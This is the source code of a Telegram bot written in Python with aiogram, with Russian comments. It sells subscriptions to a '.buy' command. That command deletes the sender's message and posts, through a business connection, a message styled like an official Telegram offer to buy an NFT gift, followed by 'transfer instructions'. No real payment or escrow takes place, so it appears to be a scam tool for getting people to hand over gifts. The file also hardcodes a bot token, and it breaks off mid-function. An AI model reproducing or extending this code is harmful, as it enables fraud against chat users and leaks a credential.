import asyncio
import base64
import logging
import json
import os
import re
import secrets
import shutil
import string
import time
from decimal import Decimal, InvalidOperation
from urllib.parse import quote

import aiohttp
import aiosqlite

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
from aiogram.methods import DeleteBusinessMessages, SendMessage, EditMessageText
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
    LabeledPrice,
    PreCheckoutQuery,
)

# ============================================================
# НАСТРОЙКИ
# ============================================================

# ВСТАВЬ СЮДА СВОЙ НОВЫЙ ТОКЕН ОТ BOTFATHER!
BOT_TOKEN = "9299466432:AAEAw1BZDyYEISAB4f3TPSBDsK0wQ0JV1ss"

OFFER_DURATION_HOURS = 6
PARALLEL = True
KEEPALIVE_SECONDS = 20
DEFAULT_LANGUAGE = "ru"
DEFAULT_BUYER = "@xmoyg"
ESCROW_RESERVE_HOURS = 24
ACCEPT_FIRST = False

USE_PREMIUM_EMOJI = True
ACCEPT_EMOJI_ID = "5776375003280838798"
DECLINE_EMOJI_ID = "5778527486270770928"

STARS_PREMIUM_EMOJI_ID = "5848021027782661221"
GRAM_PREMIUM_EMOJI_ID = "5318901904686754959"

# ID администратора бота
ADMIN_ID = 8911611205

# Платный доступ
DB_PATH = "access.db"  # Для BotHost ставим локальный путь
LEGACY_DB_PATH = "access.db"
STARS_EMOJI_ID = "5897651460509234625"
TON_API_URL = os.getenv("TON_API_URL", "https://toncenter.com/api/v2")
TON_API_V3_URL = os.getenv("TON_API_V3_URL", "https://toncenter.com/api/v3")
TONCENTER_API_KEY = os.getenv("TONCENTER_API_KEY", "")
DEFAULT_SUBSCRIPTION_PRICE = Decimal(os.getenv("SUBSCRIPTION_PRICE_TON", "1"))
DEFAULT_SUBSCRIPTION_DAYS = int(os.getenv("SUBSCRIPTION_DAYS", "30"))
DEFAULT_TON_ADDRESS = os.getenv("TON_ADDRESS", "")
PAYMENT_CHECK_INTERVAL = int(os.getenv("PAYMENT_CHECK_INTERVAL", "15"))

ADMIN_STATES = {}
USER_STATES = {}

# ============================================================
# ЛОГИ
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

logger = logging.getLogger(__name__)

# ============================================================
# ТЕКСТЫ
# ============================================================

TEXTS = {
    "ru": {
        "offer": "Пользователь предлагает вам\n<b>{amount} {currency}</b> за подарок {nft}.\n\n",
        "accept": "Принять",
        "decline": "Отклонить",
        "cancelled": "❌ <b>Предложение отклонено</b>",
        "stars": "Звёзд",
        "gram": "GRAM",
    },
    "en": {
        "offer": "The user is offering you\n<b>{amount} {currency}</b> for the gift {nft}.\n\n",
        "accept": "Accept",
        "decline": "Decline",
        "cancelled": "❌ <b>Offer declined</b>",
        "stars": "Stars",
        "gram": "GRAM",
    },
    "ar": {
        "offer": "يقدم لك المستخدم\n<b>{amount} {currency}</b> مقابل الهدية {nft}.\n\n",
        "accept": "قبول",
        "decline": "رفض",
        "cancelled": "❌ <b>تم رفض العرض</b>",
        "stars": "Stars",
        "gram": "GRAM",
    },
    "zh": {
        "offer": "用户向您提供\n<b>{amount} {currency}</b> 购买礼物 {nft}。\n\n",
        "accept": "接受",
        "decline": "拒绝",
        "cancelled": "❌ <b>报价已拒绝</b>",
        "stars": "Stars",
        "gram": "GRAM",
    },
}

# ============================================================
# ХРАНИЛИЩЕ АКТИВНЫХ ОФФЕРОВ
# ============================================================

OFFERS = {}

def currency_emoji_html(currency_key):
    if currency_key == "gram":
        return '<tg-emoji emoji-id="' + GRAM_PREMIUM_EMOJI_ID + '">💎</tg-emoji>'
    return '<tg-emoji emoji-id="' + STARS_PREMIUM_EMOJI_ID + '">⭐️</tg-emoji>'

# ============================================================
# ПОЛЬЗОВАТЕЛЬСКИЙ ИНТЕРФЕЙС И ОФФЕРЫ
# ============================================================

async def ensure_user_settings(user_id):
    now = int(time.time())
    db = await db_connect()
    try:
        await db.execute(
            "INSERT OR IGNORE INTO user_settings(user_id,language,timer_hours,notifications,created_at,updated_at) VALUES(?,?,?,?,?,?)",
            (user_id, DEFAULT_LANGUAGE, 6, 1, now, now),
        )
        await db.commit()
        cur = await db.execute("SELECT * FROM user_settings WHERE user_id=?", (user_id,))
        return await cur.fetchone()
    finally:
        await db.close()

async def get_user_settings(user_id):
    return await ensure_user_settings(user_id)

async def set_user_setting(user_id, field, value):
    if field not in {"language", "timer_hours", "notifications"}:
        return
    await ensure_user_settings(user_id)
    db = await db_connect()
    try:
        await db.execute(f"UPDATE user_settings SET {field}=?, updated_at=? WHERE user_id=?", (value, int(time.time()), user_id))
        await db.commit()
    finally:
        await db.close()

async def save_user_offer(order_id, owner_user_id, data, status, message_id, connection_id, chat_id, expires_at):
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute(
            "INSERT OR REPLACE INTO user_offers(order_id,owner_user_id,data_json,status,message_id,connection_id,chat_id,expires_at,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
            (order_id, owner_user_id, json.dumps(data, ensure_ascii=False), status, message_id, connection_id, chat_id, int(expires_at), now, now),
        )
        await db.commit()
    finally:
        await db.close()

async def update_user_offer_status(order_id, status):
    db = await db_connect()
    try:
        await db.execute("UPDATE user_offers SET status=?, updated_at=? WHERE order_id=?", (status, int(time.time()), order_id))
        await db.commit()
    finally:
        await db.close()

async def get_user_offer(order_id):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM user_offers WHERE order_id=?", (order_id,))
        return await cur.fetchone()
    finally:
        await db.close()

async def get_user_offers(user_id, limit=30):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM user_offers WHERE owner_user_id=? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
        return await cur.fetchall()
    finally:
        await db.close()

def user_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Создать оффер", style="success", callback_data="user_create_offer")],
        [InlineKeyboardButton(text="Мои офферы", style="primary", callback_data="user_offers")],
        [InlineKeyboardButton(text="Статистика", style="primary", callback_data="user_stats")],
        [InlineKeyboardButton(text="Быстрые команды", style="primary", callback_data="user_quick_commands")],
        [InlineKeyboardButton(text="Настройки", style="primary", callback_data="user_settings")],
    ])

def offer_status_label(status):
    return {"active": "активен", "accepted": "принят", "declined": "отклонён", "expired": "истёк"}.get(status, status)

def user_offers_keyboard(rows):
    buttons = []
    for row in rows[:8]:
        label = f"{row['order_id']} — {offer_status_label(row['status'])}"
        buttons.append([InlineKeyboardButton(text=label, style="primary", callback_data=f"user_offer:{row['order_id']}")])
    buttons.append([InlineKeyboardButton(text="Создать оффер", style="success", callback_data="user_create_offer")])
    buttons.append([InlineKeyboardButton(text="Статистика", style="primary", callback_data="user_stats")])
    buttons.append([InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

async def render_user_panel(message, edit=False):
    text = "<b>Панель пользователя</b>\n\nУправление офферами, статистикой и настройками."
    if edit:
        await message.edit_text(text, reply_markup=user_panel_keyboard())
    else:
        await message.answer(text, reply_markup=user_panel_keyboard())

async def send_business_offer(data, owner_user_id, connection_id, chat_id, order_id=None):
    order_id = order_id or generate_order_id()
    data = dict(data)
    data["order_id"] = order_id
    owner = await bot.get_chat(owner_user_id)
    data["buyer"] = f"@{owner.username}" if owner.username else str(owner_user_id)
    data["owner_user_id"] = owner_user_id
    data["created_by_panel"] = True
    OFFERS[order_id] = dict(data)
    nft_url = data["nft"]["url"]
    expires_at = 4102444800
    OFFERS[order_id]["expires_at"] = expires_at
    offer_text, keyboard = create_offer(data, premium=USE_PREMIUM_EMOJI, order_id=order_id)
    sent = await bot(SendMessage(
        chat_id=chat_id,
        text=offer_text,
        business_connection_id=connection_id,
        reply_markup=keyboard,
        link_preview_options=LinkPreviewOptions(is_disabled=False, url=nft_url, show_above_text=True),
    ))
    OFFERS[order_id]["message_id"] = sent.message_id
    OFFERS[order_id]["connection_id"] = connection_id
    OFFERS[order_id]["chat_id"] = chat_id
    await save_user_offer(order_id, owner_user_id, data, "active", sent.message_id, connection_id, chat_id, expires_at)
    return order_id

# ============================================================
# NFT URL И .BUY
# ============================================================

NFT_REGEX = re.compile(r"^(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)$", re.IGNORECASE)

def parse_nft(url):
    url = url.strip()
    match = NFT_REGEX.match(url)
    if not match: return None
    slug = match.group(1)
    match = re.match(r"^(.+)-(\d+)$", slug)
    if not match: return None
    return {"slug": slug, "name": match.group(1).replace("-", " "), "number": match.group(2), "url": "https://t.me/nft/" + slug}

def parse_buy_command(text):
    parts = text.strip().split()
    if len(parts) < 3 or parts[0].lower() != ".buy": return None
    nft_url, amount_raw = parts[1], parts[2]

    try:
        amount_value = float(amount_raw)
        if amount_value <= 0: return None
    except ValueError: return None

    amount = str(int(amount_value)) if amount_value.is_integer() else str(amount_value)
    currency, language, timer_hours = "stars", DEFAULT_LANGUAGE, 6

    for argument in parts[3:]:
        arg = argument.lower()
        if arg in ("stars", "star", "tt"): currency = "stars"
        elif arg == "gram": currency = "gram"
        elif arg in ("ru", "en", "ar", "zh", "cn", "kit"): language = arg if arg in ("ru", "en", "ar") else "zh"
        elif arg in ("6", "6h", "6ч"): timer_hours = 6
        elif arg in ("12", "12h", "12ч"): timer_hours = 12

    nft = parse_nft(nft_url)
    if nft is None: return None
    return {"nft": nft, "amount": amount, "currency": currency, "language": language, "timer_hours": timer_hours, "buyer": None}

def generate_order_id():
    return "TG-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def create_offer(data, premium=True, order_id="", remaining_seconds=None):
    lang = TEXTS[data["language"]]
    nft_html = f'<a href="{data["nft"]["url"]}">{data["nft"]["name"]} #{data["nft"]["number"]}</a>'
    
    text = lang["offer"].format(
        amount=data["amount"],
        currency=currency_emoji_html(data["currency"]) if premium else ("⭐️" if data["currency"] == "stars" else lang["currency"]),
        nft=nft_html,
    )
    
    accept_btn = InlineKeyboardButton(text=lang["accept"], callback_data=f"offer_accept:{data['language']}:{order_id}")
    decline_btn = InlineKeyboardButton(text=lang["decline"], callback_data=f"offer_decline:{data['language']}:{order_id}")
    
    row = [accept_btn, decline_btn] if ACCEPT_FIRST else [decline_btn, accept_btn]
    return text, InlineKeyboardMarkup(inline_keyboard=[row])

def create_accept_text(data):
    from html import escape
    nft = data["nft"]
    currency = (data.get("currency") or "stars").lower()
    amount = escape(str(data.get("amount", "")))
    name = escape(str(nft.get("name", "NFT")))
    number = escape(str(nft.get("number", "")))
    order = escape(str(data.get("order_id") or generate_order_id()))
    asset = "GRAM" if currency == "gram" else "Stars"
    gift = f"{name} #{number}"
    nft_url = escape(str(nft.get("url") or "https://t.me/nft/" + str(nft.get("slug", ""))), quote=True)
    linked_gift = f'<a href="{nft_url}">{gift}</a>'
    emoji = currency_emoji_html(currency)
    recipient = escape(str(data.get("buyer") or "не указан"))
    
    return (
        f"<b><i>Сделка — #{order}</i></b>\n\n"
        f"<b><i>Покупатель предложил {amount} {emoji} {asset} "
        f"за подарок {gift}.</i></b>\n\n"
        "<b><i>Инструкция по передаче NFT:</i></b>\n\n"
        "<b><i>1. Проверьте данные сделки и статус оплаты.</i></b>\n\n"
        f"<b><i>2. Проверьте подарок {linked_gift} "
        f"и данные покупателя {recipient} перед передачей.</i></b>\n\n"
        "<b><i>3. Убедитесь, что передача завершена.</i></b>\n\n"
        "<b><i>После передачи проверьте поступление средств "
        "согласно условиям сервиса.</i></b>"
    )

def create_accept_keyboard(data):
    buyer = str(data.get("buyer") or "").lstrip("@")
    url = f"tg://user?id={buyer}" if buyer.isdigit() else "https://t.me/" + buyer
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Профиль покупателя", url=url)]])

def language_from_callback(data):
    parts = data.split(":")
    return parts[1] if len(parts) >= 2 and parts[1] in TEXTS else DEFAULT_LANGUAGE

def order_id_from_callback(data):
    return data.split(":", 2)[2] if len(data.split(":")) >= 3 else ""

# ============================================================
# БАЗА ДАННЫХ И ПЛАТЕЖИ
# ============================================================

async def db_connect():
    db = await aiosqlite.connect(DB_PATH)
    db.row_factory = aiosqlite.Row
    return db

async def init_db():
    db = await db_connect()
    try:
        await db.executescript("""
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
        CREATE TABLE IF NOT EXISTS subscriptions (user_id INTEGER PRIMARY KEY, expires_at INTEGER NOT NULL, source TEXT NOT NULL DEFAULT 'payment');
        CREATE TABLE IF NOT EXISTS free_access (user_id INTEGER PRIMARY KEY, added_at INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS payments (
            invoice_id TEXT PRIMARY KEY, user_id INTEGER NOT NULL, amount_nano INTEGER NOT NULL, comment TEXT NOT NULL UNIQUE, created_at INTEGER NOT NULL, expires_at INTEGER NOT NULL, status TEXT NOT NULL DEFAULT 'pending', tx_hash TEXT, days INTEGER, product_id INTEGER
        );
        CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, days INTEGER NOT NULL, ton_price TEXT NOT NULL, stars_price INTEGER NOT NULL, active INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS stars_payments (payment_id TEXT PRIMARY KEY, user_id INTEGER NOT NULL, product_id INTEGER NOT NULL, stars_price INTEGER NOT NULL, created_at INTEGER NOT NULL, status TEXT NOT NULL DEFAULT 'paid', telegram_charge_id TEXT UNIQUE);
        CREATE TABLE IF NOT EXISTS internal_users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, added_at INTEGER NOT NULL, last_seen INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS accepted_deals (order_id TEXT PRIMARY KEY, buyer TEXT, amount TEXT NOT NULL, currency TEXT NOT NULL, nft_name TEXT NOT NULL, nft_number TEXT NOT NULL, nft_url TEXT NOT NULL, accepted_at INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS user_offers (order_id TEXT PRIMARY KEY, owner_user_id INTEGER NOT NULL, data_json TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'active', message_id INTEGER, connection_id TEXT, chat_id INTEGER, expires_at INTEGER NOT NULL, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER PRIMARY KEY, language TEXT NOT NULL DEFAULT 'ru', timer_hours INTEGER NOT NULL DEFAULT 6, notifications INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL);
        CREATE INDEX IF NOT EXISTS idx_payments_status ON payments(status);
        """)
        defaults = {"subscription_price_ton": str(DEFAULT_SUBSCRIPTION_PRICE), "subscription_days": str(DEFAULT_SUBSCRIPTION_DAYS), "ton_address": DEFAULT_TON_ADDRESS}
        for key, value in defaults.items():
            await db.execute("INSERT OR IGNORE INTO settings(key, value) VALUES(?, ?)", (key, value))
        cur = await db.execute("SELECT COUNT(*) c FROM products")
        if (await cur.fetchone())["c"] == 0:
            await db.execute("INSERT INTO products(name, days, ton_price, stars_price, active, created_at) VALUES(?,?,?,?,1,?)", ("Подписка", DEFAULT_SUBSCRIPTION_DAYS, str(DEFAULT_SUBSCRIPTION_PRICE), int(os.getenv("SUBSCRIPTION_STARS", "100")), int(time.time())))
        await db.commit()
    finally:
        await db.close()

async def get_setting(key, default=""):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT value FROM settings WHERE key=?", (key,))
        row = await cur.fetchone()
        return row["value"] if row else default
    finally:
        await db.close()

async def set_setting(key, value):
    db = await db_connect()
    try:
        await db.execute("INSERT INTO settings(key, value) VALUES(?, ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))
        await db.commit()
    finally:
        await db.close()

async def register_internal_user(user_id, username=None, first_name=None):
    if not user_id: return
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute("INSERT INTO internal_users(user_id,username,first_name,added_at,last_seen) VALUES(?,?,?,?,?) ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, first_name=excluded.first_name, last_seen=excluded.last_seen", (int(user_id), username, first_name, now, now))
        await db.commit()
    finally:
        await db.close()

async def has_access(user_id):
    now = int(time.time())
    db = await db_connect()
    try:
        cur = await db.execute("SELECT 1 FROM free_access WHERE user_id=?", (user_id,))
        if await cur.fetchone(): return True
        cur = await db.execute("SELECT expires_at FROM subscriptions WHERE user_id=?", (user_id,))
        row = await cur.fetchone()
        return bool(row and int(row["expires_at"]) > now)
    finally:
        await db.close()

async def add_free_access(user_id):
    db = await db_connect()
    try:
        await db.execute("INSERT OR IGNORE INTO free_access(user_id, added_at) VALUES(?, ?)", (user_id, int(time.time())))
        await db.commit()
    finally:
        await db.close()

async def revoke_user_access(user_id):
    db = await db_connect()
    try:
        await db.execute("DELETE FROM subscriptions WHERE user_id=?", (user_id,))
        await db.execute("DELETE FROM free_access WHERE user_id=?", (user_id,))
        await db.commit()
    finally:
        await db.close()

def ton_to_nano(value):
    return int(Decimal(str(value)) * Decimal(1_000_000_000))

def format_ton(value):
    return format(Decimal(str(value)).normalize(), "f")

async def get_products(active_only=True):
    db = await db_connect()
    try:
        sql = "SELECT * FROM products" + (" WHERE active=1" if active_only else "") + " ORDER BY id"
        cur = await db.execute(sql)
        return await cur.fetchall()
    finally:
        await db.close()

async def get_product(product_id):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM products WHERE id=?", (product_id,))
        return await cur.fetchone()
    finally:
        await db.close()

async def create_invoice(user_id, product_id=None):
    product = await get_product(product_id) if product_id is not None else None
    if product is not None:
        price, days = Decimal(product["ton_price"]), int(product["days"])
    else:
        price, days = Decimal(await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))), int(await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS)))
    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
    if price <= 0: raise ValueError("Цена подписки должна быть больше 0")
    if not address.strip(): raise ValueError("TON-адрес не настроен")

    now = int(time.time())
    invoice_id, comment = secrets.token_hex(8).upper(), f"SUB-{user_id}-{secrets.token_hex(8).upper()}"
    amount_nano, expires_at = ton_to_nano(price), now + 30 * 60

    db = await db_connect()
    try:
        await db.execute("INSERT INTO payments(invoice_id,user_id,amount_nano,comment,created_at,expires_at,product_id,days) VALUES(?,?,?,?,?,?,?,?)", (invoice_id, user_id, amount_nano, comment, now, expires_at, product_id, days))
        await db.commit()
    finally:
        await db.close()

    return {"invoice_id": invoice_id, "comment": comment, "amount": price, "amount_nano": amount_nano, "days": days, "expires_at": expires_at, "address": address.strip()}

# ============================================================
# БОТ
# ============================================================

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

async def access_denied_text(user_id):
    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
    return f"<b>Доступ закрыт.</b>\n\nПодписка: <b>{price} TON</b> на <b>{days} дн.</b>\n\nНажми /start, чтобы купить."

@dp.business_message()
async def handle_business_message(message: Message):
    connection_id = message.business_connection_id
    if not connection_id or not message.text or not message.chat or message.chat.type != "private": return
    command = message.text.strip()
    if not command.lower().startswith(".buy"): return

    try:
        conn = await bot.get_business_connection(business_connection_id=connection_id)
        owner = conn.user
        if not await has_access(owner.id):
            await bot(SendMessage(chat_id=message.chat.id, text=await access_denied_text(owner.id), business_connection_id=connection_id))
            return
        await register_internal_user(owner.id, owner.username, owner.first_name)
    except Exception: return

    data = parse_buy_command(command)
    if data is None: return

    settings = await get_user_settings(owner.id)
    args_lower = [part.lower() for part in command.split()[3:]]
    explicit_lang = any(part in {"ru", "en", "ar", "zh", "cn", "kit"} for part in args_lower)
    explicit_timer = any(part in {"6", "6h", "6ч", "12", "12h", "12ч"} for part in args_lower)
    if not explicit_lang and settings["language"] in TEXTS: data["language"] = settings["language"]
    if not explicit_timer and int(settings["timer_hours"]) in (6, 12): data["timer_hours"] = int(settings["timer_hours"])
    data["buyer"] = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)

    order_id = generate_order_id()
    data["order_id"] = order_id
    OFFERS[order_id] = dict(data)

    async def delete_command():
        try: await bot(DeleteBusinessMessages(business_connection_id=connection_id, message_ids=[message.message_id]))
        except Exception: pass

    async def send_offer():
        use_premium = USE_PREMIUM_EMOJI
        for _ in range(3):
            offer_text, keyboard = create_offer(data, premium=use_premium, order_id=order_id)
            try:
                sent = await bot(SendMessage(chat_id=message.chat.id, text=offer_text, business_connection_id=connection_id, reply_markup=keyboard, link_preview_options=LinkPreviewOptions(is_disabled=False, url=data["nft"]["url"], show_above_text=True)))
                OFFERS[order_id].update({"message_id": sent.message_id, "connection_id": connection_id, "owner_user_id": owner.id, "chat_id": message.chat.id, "expires_at": 4102444800})
                await save_user_offer(order_id, owner.id, data, "active", sent.message_id, connection_id, message.chat.id, 4102444800)
                return
            except TelegramRetryAfter as e: await asyncio.sleep(e.retry_after)
            except TelegramBadRequest:
                if use_premium: use_premium = False; continue
                return

    if PARALLEL: await asyncio.gather(delete_command(), send_offer())
    else: await delete_command(); await send_offer()

# ============================================================
# КНОПКИ ОФФЕРА (ИСПРАВЛЕНО)
# ============================================================

async def edit_original_offer_message(callback: CallbackQuery, text: str, reply_markup=None, link_preview_options=None):
    try:
        if callback.message.business_connection_id:
            return await callback.bot(EditMessageText(
                business_connection_id=callback.message.business_connection_id, chat_id=callback.message.chat.id,
                message_id=callback.message.message_id, text=text, parse_mode=ParseMode.HTML,
                reply_markup=reply_markup, link_preview_options=link_preview_options,
            ))
        return await callback.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup, link_preview_options=link_preview_options)
    except Exception as e:
        logger.error("EDIT ERROR: %s", e)

@dp.callback_query(F.data.startswith("offer_decline"))
async def decline_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    order_id = order_id_from_callback(callback.data)
    try:
        await edit_original_offer_message(callback, TEXTS[language]["cancelled"])
        await callback.answer()
        if order_id: await update_user_offer_status(order_id, "declined")
    except Exception as e:
        await callback.answer(f"Ошибка: {str(e)[:100]}", show_alert=True)

@dp.callback_query(F.data.startswith("offer_accept"))
async def accept_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    order_id = order_id_from_callback(callback.data)
    
    data = OFFERS.get(order_id)
    if not data:
        row = await get_user_offer(order_id)
        if row: data = json.loads(row["data_json"])
    if not data:
        await callback.answer("Оффер не найден или устарел.", show_alert=True)
        return
        
    await callback.answer("Проверьте личность покупателя и подтверждение оплаты до передачи NFT.", show_alert=True)
    
    try:
        await edit_original_offer_message(
            callback,
            text=create_accept_text(data),
            reply_markup=create_accept_keyboard(data),
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
        if order_id: await update_user_offer_status(order_id, "accepted")
    except Exception as e:
        logger.exception("ACCEPT ERROR | %s", e)

# ============================================================
# ОПЛАТА И ПАНЕЛЬ
# ============================================================

@dp.message(F.text == "/start")
async def start_command(message: Message):
    await register_internal_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
    if message.from_user.id == ADMIN_ID:
        await message.answer("<b>Админ.</b> Используй /admin для панели управления.")
        return
    if await has_access(message.from_user.id):
        await ensure_user_settings(message.from_user.id)
        await render_user_panel(message)
        return
    products = await get_products()
    buttons = []
    for product in products:
        buttons.append([InlineKeyboardButton(text=f"{product['name']} — {format_ton(product['ton_price'])} TON / {product['stars_price']} Stars", style="primary", callback_data=f"buy_product:{product['id']}")])
    if not buttons:
        await message.answer("<b>Товары пока не настроены.</b>")
        return
    await message.answer("<b>Доступ к .buy</b>\n\nВыберите подписку:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@dp.message(F.text == "/menu")
async def menu_command(message: Message):
    if not await has_access(message.from_user.id): return await message.answer(await access_denied_text(message.from_user.id))
    await render_user_panel(message)

@dp.callback_query(F.data.startswith("buy_product:"))
async def buy_product(callback: CallbackQuery):
    await callback.answer()
    try:
        product_id = int(callback.data.split(":", 1)[1])
        product = await get_product(product_id)
        if not product or not int(product["active"]):
            await callback.message.edit_text("Товар недоступен.")
            return
        buttons = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"Оплатить {product['stars_price']} Stars", style="success", callback_data=f"buy_stars:{product_id}")],
            [InlineKeyboardButton(text=f"Оплатить {format_ton(product['ton_price'])} TON", style="success", callback_data=f"buy_ton:{product_id}")],
            [InlineKeyboardButton(text="Назад", style="primary", callback_data="buy_back")],
        ])
        await callback.message.edit_text(f"<b>{product['name']}</b>\n\nСрок: <b>{product['days']} дн.</b>\nTON: <b>{format_ton(product['ton_price'])}</b>\nStars: <b>{product['stars_price']} ⭐</b>\n\nВыберите способ оплаты:", reply_markup=buttons)
    except Exception:
        await callback.message.edit_text("Не удалось открыть товар.")

@dp.callback_query(F.data == "buy_back")
async def buy_back(callback: CallbackQuery):
    products = await get_products()
    buttons = [[InlineKeyboardButton(text=f"{p['name']} — {format_ton(p['ton_price'])} TON / {p['stars_price']} Stars", style="primary", callback_data=f"buy_product:{p['id']}")] for p in products]
    await callback.message.edit_text("<b>Доступ к .buy</b>\n\nВыберите подписку:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
    await callback.answer()

@dp.callback_query(F.data.startswith("buy_ton:"))
async def buy_ton(callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    try:
        product_id = int(callback.data.split(":", 1)[1])
        invoice = await create_invoice(user_id, product_id)
    except Exception as error:
        return await callback.message.edit_text(f"<b>Ошибка:</b> {str(error)[:100]}")
    
    pay_url = f"https://app.tonkeeper.com/transfer/{invoice['address']}?amount={invoice['amount_nano']}&text={quote(invoice['comment'])}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть Tonkeeper", style="success", url=pay_url)],
        [InlineKeyboardButton(text="Проверить оплату", style="primary", callback_data=f"check_payment:{invoice['invoice_id']}")],
    ])
    product = await get_product(product_id)
    product_name = product['name'] if product else "Подписка"
    await callback.message.edit_text(
        f"<b>Оплата TON</b>\n\nТовар: <b>{product_name}</b>\nСумма: <b>{format_ton(invoice['amount'])} TON</b>\nСрок: <b>{invoice['days']} дн.</b>\n\n"
        f"Адрес: <code>{invoice['address']}</code>\nСумма: <code>{format_ton(invoice['amount'])} TON</code>\nКомментарий: <code>{invoice['comment']}</code>\n\n"
        "После поступления платежа доступ выдастся автоматически. Нажмите «Проверить оплату», если не обновилось.", reply_markup=keyboard,
    )

@dp.callback_query(F.data == "user_panel")
async def user_panel_callback(callback: CallbackQuery):
    if not await has_access(callback.from_user.id):
        return await callback.answer("Доступ закрыт", show_alert=True)
    await render_user_panel(callback.message, edit=True)
    await callback.answer()

@dp.callback_query(F.data == "user_offers")
async def user_offers_callback(callback: CallbackQuery):
    rows = await get_user_offers(callback.from_user.id)
    text = "<b>Мои офферы</b>\n\nВыберите оффер для управления." if rows else "<b>Мои офферы</b>\n\nОфферов пока нет."
    await callback.message.edit_text(text, reply_markup=user_offers_keyboard(rows))
    await callback.answer()

@dp.callback_query(F.data.startswith("user_offer:"))
async def user_offer_detail(callback: CallbackQuery):
    order_id = callback.data.split(":", 1)[1]
    row = await get_user_offer(order_id)
    if not row or int(row["owner_user_id"]) != callback.from_user.id:
        return await callback.answer("Оффер не найден", show_alert=True)
    data = json.loads(row["data_json"])
    text = f"<b>{order_id}</b>\n\nNFT: <a href=\"{data['nft']['url']}\">{data['nft']['name']} #{data['nft']['number']}</a>\nЦена: <b>{data['amount']} {data['currency']}</b>\nЯзык: <b>{data.get('language', DEFAULT_LANGUAGE).upper()}</b>\nСтатус: <b>{offer_status_label(row['status'])}</b>"
    buttons = [[InlineKeyboardButton(text="Назад", style="primary", callback_data="user_offers")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), disable_web_page_preview=True)
    await callback.answer()

@dp.callback_query(F.data == "user_stats")
async def user_stats_callback(callback: CallbackQuery):
    rows = await get_user_offers(callback.from_user.id, 1000)
    counts = {"active":0,"accepted":0,"declined":0,"expired":0}
    for row in rows: counts[row["status"]] = counts.get(row["status"], 0) + 1
    text = f"<b>Статистика</b>\n\nВсего: <b>{len(rows)}</b>\nАктивных: <b>{counts['active']}</b>\nПринято: <b>{counts['accepted']}</b>\nОтклонено: <b>{counts['declined']}</b>\nИстекло: <b>{counts['expired']}</b>"
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")]]))
    await callback.answer()

# ============================================================
# АДМИН-ПАНЕЛЬ (СОКРАЩЕННАЯ)
# ============================================================

def admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚙️ Настройки", style="primary", callback_data="admin_settings")],
        [InlineKeyboardButton(text="➕ Выдать доступ", style="success", callback_data="admin_free_add")],
        [InlineKeyboardButton(text="➖ Забрать доступ", style="danger", callback_data="admin_revoke")],
    ])

@dp.message(F.text == "/admin")
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: return
    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
